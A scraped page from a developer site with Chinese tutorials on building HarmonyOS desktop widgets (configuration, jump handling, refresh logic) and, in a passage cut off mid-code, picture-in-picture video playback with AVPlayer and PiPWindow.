pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>桌面卡片是比较常见的功能，本案例详细列举了卡片开发的大部分功能，如使用postCardAction接口快速拉起卡片提供方应用的指定UIAbility，通过message事件刷新卡片内容等，为开发者提供了卡片功能的展示。</p>
<h3 data-id="heading-1">效果图预览</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3197ee4a1e484043be642cf73fc7ff83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623376&amp;x-signature=T%2F1OT3voKJCBzIlE22EsE23iED4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">使用说明</h3>
<ol>
<li>长按应用，添加卡片到桌面。</li>
<li>卡片内可滑动选择案例，点击可进入案例详情。</li>
<li>部分案例无详情页时，点击跳转到首页瀑布流。</li>
</ol>
<h3 data-id="heading-3">实现思路</h3>
<ol>
<li>新建卡片</li>
<li>配置formconfig</li>
<li>编写卡片UI代码</li>
<li>触发刷新事件</li>
<li>触发点击事件</li>
</ol>
<h3 data-id="heading-4">实现步骤</h3>
<p>本例涉及的关键特性和实现方案如下：</p>
<ol>
<li>
<p>新建卡片。右键点击entry目录，选择新建-&gt;Service Widget-&gt;Dynamic Widget，其中Dynamic Widget为动态卡片，Static Widget为静态卡片。此时会生成几个文件：配置文件<code>form_config.json</code>；卡片Ability<code>EntryFormAbility.ets</code>；卡片组件<code>WidgetCard.ets</code>。</p>
</li>
<li>
<p>新建卡片后，根据需要（如卡片大小，刷新时间，动态静态卡片设置）配置<code>form_config.json</code>。</p>
<p>{
"forms": [
{
"name": "widget", // 卡片的名称。
"displayName": "<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>:</mo><mi>w</mi><mi>i</mi><mi>d</mi><mi>g</mi><mi>e</mi><msub><mi>t</mi><mi>d</mi></msub><mi>i</mi><mi>s</mi><mi>p</mi><mi>l</mi><mi>a</mi><msub><mi>y</mi><mi>n</mi></msub><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">"</mi><mo separator="true">,</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mtext>卡片的显示名称。</mtext><mi mathvariant="normal">"</mi><mi>d</mi><mi>e</mi><mi>s</mi><mi>c</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">"</mi><mo>:</mo><mi mathvariant="normal">"</mi></mrow><annotation encoding="application/x-tex">string:widget_display_name", // 卡片的显示名称。
      "description": "</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">in</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em;">pl</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal">am</span><span class="mord mathnormal">e</span><span class="mord">"</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">//</span><span class="mord cjk_fallback">卡片的显示名称。</span><span class="mord">"</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.02778em;">escr</span><span class="mord mathnormal">i</span><span class="mord mathnormal">pt</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">"</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">"</span></span></span></span></span>string:widget_desc", // 卡片的描述。
"src": "./ets/widget/pages/WidgetCard.ets", // 卡片对应的UI代码的完整路径。
"uiSyntax": "arkts", // 卡片的类型
"window": { // 用于定义与显示窗口相关的配置。
"designWidth": 720,
"autoDesignWidth": true
},
"colorMode": "auto", // 卡片的主题样式。
"isDynamic": true, // 卡片是否为动态卡片。
"isDefault": true, // 卡片是否为默认卡片。
"updateEnabled": true, // 卡片是否支持周期性刷新。
"scheduledUpdateTime": "10:30", // 卡片的定点刷新的时刻。
"updateDuration": 1, // 卡片定时刷新的更新周期，单位为30分钟，取值为自然数。
"defaultDimension": "6<em>4", // 卡片的默认外观规格。
"supportDimensions": [ // 卡片支持的外观规格，取值范围。
"6</em>4"
]
}
]
}</p>
</li>
<li>
<p>编写卡片UI代码。在主文件<code>WidgetCard.ets</code>中添加UI组件，需要注意的是：ArkTS卡片存在较多约束（如不支持导入共享包），较多逻辑不可在卡片中使用，在使用时需要根据文档进行操作。</p>
</li>
<li>
<p>编写跳转事件：当应用未被拉起时，点击某个卡片时跳转到具体的案例页面。在<code>EntryAbility.ets</code>中补充逻辑：onCreate生命周期内获取want.parameters.params判断卡片内容的跳转。</p>
<p>// EntryAbility.ets
export default class EntryAbility extends UIAbility {
onCreate(want: Want, launchParam: AbilityConstant.LaunchParam): void {
// ...
// 桌面卡片判断跳转内容
if (want?.parameters?.params) {
// want.parameters.params 对应 postCardAction() 中 params 内容
let params: Record&lt;string, Object&gt; = JSON.parse(want.parameters.params as string);
this.selectPage = params.targetPage as string;
}
// ...
}
}</p>
</li>
<li>
<p>编写跳转事件：当应用在后台时，点击某个卡片时跳转到具体的案例页面。可从onNewWant生命周期获取want.parameters.params判断卡片内容的跳转。</p>
<p>// EntryAbility.ets
export default class EntryAbility extends UIAbility {
// 如果UIAbility已在后台运行，在收到Router事件后会触发onNewWant生命周期回调
onNewWant(want: Want, launchParam: AbilityConstant.LaunchParam): void {
if (want?.parameters?.params) {
// want.parameters.params 对应 postCardAction() 中 params 内容
let params: Record&lt;string, Object&gt; = JSON.parse(want.parameters.params as string);
this.selectPage = params.targetPage as string;
}
if (this.currentWindowStage !== null) {
//  存在窗口时点击卡片后进行页面跳转
this.onWindowStageCreate(this.currentWindowStage);
}
}
}</p>
</li>
<li>
<p>具体跳转逻辑编写。在onWindowStageCreate生命周期内进行具体的跳转逻辑。</p>
<p>// EntryAbility.ets
export default class EntryAbility extends UIAbility {
onWindowStageCreate(windowStage: window.WindowStage): void {
// 判断是否存在窗口可进行页面跳转
if (this.currentWindowStage === null) {
this.currentWindowStage = windowStage;
}
//  点击卡片后进行页面跳转
if (this.selectPage) {
this.storage.setOrCreate('formNavigationRouter', this.selectPage);
windowStage.loadContent('pages/EntryView', this.storage, (err, data) =&gt; {
if (err.code) {
logger.error(DOMAIN_NUMBER.toString(), TAG, 'Failed to load the content. Cause: %{public}s', JSON.stringify(err) ?? '');
return;
}
logger.info(DOMAIN_NUMBER.toString(), TAG, 'Succeeded in loading the content. Data: %{public}s', JSON.stringify(data) ?? '');
});
}
// ...
}
}</p>
</li>
<li>
<p>编写跳转事件：在<code>EntryAbility.ets</code>编写事件后，同时在接收案例参数的<code>EntryView.ets</code>内处理页面跳转逻辑。通过和DynamicsRouter内的数据对比，判断通过storage传入的页面是哪一个，然后执行pushUri跳转。</p>
<p>@Entry(storage)
@Component
struct EntryView {
onPageShow(): void {
// 从卡片进入页面时判断具体跳转页面
if (this.formRouter) {
waterFlowData.forEach((item: SceneModuleInfo) =&gt; {
let index = item.appUri.indexOf(this.formRouter);
if (index &gt; -1) {
if (DynamicsRouter.appRouterStack.slice(-1)[0].name !== item.appUri) {
DynamicsRouter.clear();
DynamicsRouter.pushUri(item.appUri);
}
return;
}
})
this.formRouter = '';
}
}
}</p>
</li>
<li>
<p>判断卡片大小：获取卡片详情，根据宽高比获取卡片的规格，不同规格显示内容不同。在<code>EntryFormAbility.ets</code>中补充点击卡片进入时查找对应案例的逻辑。在onAddForm生命周期内做卡片生成时，createFormBindingData方法传递属性。</p>
<p>// EntryFormAbility.ets
export default class EntryFormAbility extends FormExtensionAbility {
// 卡片对象集合
onAddForm(want: Want): formBindingData.FormBindingData {
let isLongCard: boolean = true;
if ((want.parameters?.[formInfo.FormParam.WIDTH_KEY] as number) /
(want.parameters?.[formInfo.FormParam.HEIGHT_KEY] as number) &gt; 0.666) {
isLongCard = false;
}
// 使用方创建卡片时触发，提供方需要返回卡片数据绑定类
let obj: Record&lt;string, string | boolean&gt; = {
'title': 'titleOnAddForm',
'isLongCard': isLongCard
};
let formData: formBindingData.FormBindingData = formBindingData.createFormBindingData(obj);
return formData;
}
}</p>
</li>
<li>
<p>编写刷新事件：当定时更新或定点更新触发时，需要更新卡片内容。onUpdateForm生命周期发生在定时更新/定点更新/卡片使用方主动请求更新时，在方法内增加获取案例数据的功能。</p>
<p>// EntryFormAbility.ets
export default class EntryFormAbility extends FormExtensionAbility {
// 网络获取README数据并利用formProvider.updateForm更新到卡片
async getData(formId: string) {
let detail: CASES[] = [];
let httpRequest = http.createHttp();
let webData: http.HttpResponse = await httpRequest.request(URL);
if (webData?.responseCode == http.ResponseCode.OK) {
try {
detail = this.formatData(webData.result.toString());
hilog.info(DOMAIN_NUMBER, TAG, '[EntryFormAbility] onFormEvent' + 'webData.result:' + webData.result);</p>
<pre><code class="hljs language-typescript" lang="typescript">        <span class="hljs-keyword">class</span> <span class="hljs-title class_">FormDataClass</span> {
           <span class="hljs-attr">detail</span>: <span class="hljs-variable constant_">CASES</span>[] = detail;
        }

        <span class="hljs-keyword">let</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormDataClass</span>();
        <span class="hljs-keyword">let</span> formInfo = formBindingData.<span class="hljs-title function_">createFormBindingData</span>(formData);
        <span class="hljs-keyword">await</span> formProvider.<span class="hljs-title function_">updateForm</span>(formId, formInfo);
        hilog.<span class="hljs-title function_">info</span>(<span class="hljs-variable constant_">DOMAIN_NUMBER</span>, <span class="hljs-variable constant_">TAG</span>, <span class="hljs-string">'%{public}s'</span>, <span class="hljs-string">'FormAbility updateForm success.'</span>);
     } <span class="hljs-keyword">catch</span> (error) {
        hilog.<span class="hljs-title function_">error</span>(<span class="hljs-variable constant_">DOMAIN_NUMBER</span>, <span class="hljs-variable constant_">TAG</span>, <span class="hljs-string">`FormAbility updateForm failed: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
     }
  } <span class="hljs-keyword">else</span> {
     hilog.<span class="hljs-title function_">error</span>(<span class="hljs-variable constant_">DOMAIN_NUMBER</span>, <span class="hljs-variable constant_">TAG</span>, <span class="hljs-string">`ArkTSCard download task failed`</span>);
     <span class="hljs-keyword">let</span> <span class="hljs-attr">param</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; = {
        <span class="hljs-string">'text'</span>: <span class="hljs-string">'刷新失败'</span>
     };
     <span class="hljs-keyword">let</span> <span class="hljs-attr">formInfo</span>: formBindingData.<span class="hljs-property">FormBindingData</span> = formBindingData.<span class="hljs-title function_">createFormBindingData</span>(param);
     formProvider.<span class="hljs-title function_">updateForm</span>(formId, formInfo);
  }
  httpRequest.<span class="hljs-title function_">destroy</span>();
</code></pre>
<p>}</p>
<p>async onUpdateForm(formId: string): Promise {
// 若卡片支持定时更新/定点更新/卡片使用方主动请求更新功能，则提供方需要重写该方法以支持数据更新
hilog.info(DOMAIN_NUMBER, TAG, '[EntryFormAbility] onUpdateForm');
this.getData(formId);
}
}</p>
</li>
<li>
<p>编写刷新事件：手动刷新内容时，需要更新卡片内容。onFormEvent生命周期发生在卡片主动通过postCardAction接口触发message事件。</p>
<p>// EntryFormAbility.ets
export default class EntryFormAbility extends FormExtensionAbility {
// 网络获取README数据并利用formProvider.updateForm更新到卡片
async getData(formId: string) {
let detail: CASES[] = [];
let httpRequest = http.createHttp();
let webData: http.HttpResponse = await httpRequest.request(URL);
if (webData?.responseCode == http.ResponseCode.OK) {
try {
detail = this.formatData(webData.result.toString());
hilog.info(DOMAIN_NUMBER, TAG, '[EntryFormAbility] onFormEvent' + 'webData.result:' + webData.result);</p>
<pre><code class="hljs language-typescript" lang="typescript">        <span class="hljs-keyword">class</span> <span class="hljs-title class_">FormDataClass</span> {
           <span class="hljs-attr">detail</span>: <span class="hljs-variable constant_">CASES</span>[] = detail;
        }

        <span class="hljs-keyword">let</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormDataClass</span>();
        <span class="hljs-keyword">let</span> formInfo = formBindingData.<span class="hljs-title function_">createFormBindingData</span>(formData);
        <span class="hljs-keyword">await</span> formProvider.<span class="hljs-title function_">updateForm</span>(formId, formInfo);
        hilog.<span class="hljs-title function_">info</span>(<span class="hljs-variable constant_">DOMAIN_NUMBER</span>, <span class="hljs-variable constant_">TAG</span>, <span class="hljs-string">'%{public}s'</span>, <span class="hljs-string">'FormAbility updateForm success.'</span>);
     } <span class="hljs-keyword">catch</span> (error) {
        hilog.<span class="hljs-title function_">error</span>(<span class="hljs-variable constant_">DOMAIN_NUMBER</span>, <span class="hljs-variable constant_">TAG</span>, <span class="hljs-string">`FormAbility updateForm failed: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
     }
  } <span class="hljs-keyword">else</span> {
     hilog.<span class="hljs-title function_">error</span>(<span class="hljs-variable constant_">DOMAIN_NUMBER</span>, <span class="hljs-variable constant_">TAG</span>, <span class="hljs-string">`ArkTSCard download task failed`</span>);
     <span class="hljs-keyword">let</span> <span class="hljs-attr">param</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; = {
        <span class="hljs-string">'text'</span>: <span class="hljs-string">'刷新失败'</span>
     };
     <span class="hljs-keyword">let</span> <span class="hljs-attr">formInfo</span>: formBindingData.<span class="hljs-property">FormBindingData</span> = formBindingData.<span class="hljs-title function_">createFormBindingData</span>(param);
     formProvider.<span class="hljs-title function_">updateForm</span>(formId, formInfo);
  }
  httpRequest.<span class="hljs-title function_">destroy</span>();
</code></pre>
<p>}</p>
<p>async onFormEvent(formId: string, message: string): Promise {
this.getData(formId);
}
}</p>
</li>
<li>
<p>编写刷新事件：参数传到卡片组件内，组件接收参数。处理<code>WidgetCard.ets</code>卡片内逻辑。卡片页面中使用LocalStorageProp装饰需要刷新的卡片数据。</p>
<p>let casesCardInfo = new LocalStorage();
@Entry(casesCardInfo)
@Component
struct Widget_DynamicCard {
@LocalStorageProp('detail') detail: CASES[] = []; // 卡片对象集合
private swiperController: SwiperController = new SwiperController();
@LocalStorageProp('isLongCard') isLongCard: boolean = false;</p>
<p>build() {
// ...
}
}</p>
</li>
</ol>
<h4 data-id="heading-5">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-6">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/160bdf1af84b464d9353063b1ae79913~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623376&amp;x-signature=PbTbJnaEcnFGrEKbgb1v%2Fw81Ag4%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：视频悬浮窗]]></title>    <link>https://juejin.cn/post/7589159665856249875</link>    <guid>https://juejin.cn/post/7589159665856249875</guid>    <pubDate>2025-12-29T14:32:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589159665856249875" data-draft-id="7589126217250947113" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：视频悬浮窗"/> <meta itemprop="keywords" content="HarmonyOS,程序员,Android"/> <meta itemprop="datePublished" content="2025-12-29T14:32:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：视频悬浮窗
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:32:12.000Z" title="Mon Dec 29 2025 14:32:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言：</h3>
<p>本示例主要介绍视频小窗口播放场景，利用媒体的AVPlayer实现视频播放以及相关操作，利用PiPWindow开启悬浮窗从而实现小窗口播放视频。</p>
<h3 data-id="heading-1">效果图预览</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/faa55123c4534e75ad2dbbdbf6d93d6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623531&amp;x-signature=qomqixm6n%2F3eZ9lrheOj4Sq7C%2Bs%3D" alt="" loading="lazy"/></p>
<p><strong>使用说明</strong></p>
<ol>
<li>等待视频加载完成，视频会自动播放。</li>
<li>将应用隐藏到后台，自动拉起悬浮窗继续播放视频。</li>
<li>点击悬浮窗恢复图标，恢复到原始播放界面，视频继续正常播放。</li>
<li>原始播放界面视频暂停不会拉起悬浮窗。</li>
<li>悬浮窗视频暂停后，再点击恢复图标，原始播放界面视频继续播放。</li>
<li>悬浮窗点击关闭之后，原始播放界面视频暂停。</li>
<li>点击原视频界面小窗口图标，可开启悬浮窗。</li>
<li>手指在原视频左侧滑动可改变视频页面的亮度（需真机验证）。</li>
<li>手指在原视频右侧滑动可改变视频的声音（需真机验证，注：本案例使用的视频暂无声音，开发者可更换视频资源验证该功能）。</li>
</ol>
<h3 data-id="heading-2">下载安装</h3>
<ol>
<li>
<p>模块oh-package.json5文件中引入依赖</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-string">"dependencies"</span>: {
  <span class="hljs-string">"@ohos/compressfile"</span>: <span class="hljs-string">"har包地址"</span>
}
</code></pre>
</li>
<li>
<p>ets文件import自定义视图实视频悬浮窗组件</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">PipWindowComponent</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos/pipwindow'</span>;
</code></pre>
</li>
</ol>
<h3 data-id="heading-3">快速使用</h3>
<p>本节主要介绍了如何快速上手使用视频悬浮窗组件，包括调节视频亮度声音控制器组件以及常见自定义参数的初始化。</p>
<ol>
<li>
<p>构建组件</p>
<p>在代码合适的位置使用PipWindowComponent组件并传入对应的参数，后续将介绍对应参数的初始化。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/**
 * 画中画控制开启、播放组件
 * player:初始化视频播放控制器
 * url:传入在线视频资源
 */</span>
PipWindowComponent({
  player: <span class="hljs-keyword">this</span>.player,
  url: <span class="hljs-keyword">this</span>.url
})
</code></pre>
</li>
<li>
<p>各参数初始化，player可直接写PipManager.getInstance().player，url必须为在线mp4视频。</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@State</span> <span class="hljs-attribute">player</span>: AVPlayer = PipManager.<span class="hljs-built_in">getInstance</span>().player; <span class="hljs-comment">// 初始化视频播放控制器</span>
<span class="hljs-variable">@State</span> <span class="hljs-attribute">url</span>: string = <span class="hljs-string">" "</span>; <span class="hljs-comment">// 传入在线视频资源</span>
</code></pre>
</li>
</ol>
<h3 data-id="heading-4">属性(接口)说明</h3>
<p>PipWindowComponent组件属性</p>
<p>属性</p>
<p>类型</p>
<p>释义</p>
<p>默认值</p>
<p>player</p>
<p>AVPlayer</p>
<p>初始化视频播放控制器</p>
<p>-</p>
<p>url</p>
<p>string</p>
<p>传入在线视频资源</p>
<p>-</p>
<h3 data-id="heading-5">实现思路</h3>
<p>本例涉及的关键特性和实现方案如下：</p>
<ol>
<li>
<p>使用媒体的AVPlayer实现视频播放。</p>
<p>/**</p>
<ul>
<li>初始化AVPlayer</li>
<li>@param url 在线视频路径</li>
<li>@returns 返回值将在线视频进行绑定
*/
async init(url: string): Promise {
await this.release();
// 创建avPlayer实例对象
this.avPlayer = await media.createAVPlayer();
this.isCreate = true;
// 创建状态机变化回调函数
await this.setSourceInfo(); // 视频信息上报函数
await this.setStateChangeCallback(); // 状态机上报回调函数
this.avPlayer.url = url; // 播放hls网络直播码流
}</li>
</ul>
</li>
<li>
<p>使用PiPWindow开启悬浮窗从而实现小窗口播放视频。</p>
<p>/**</p>
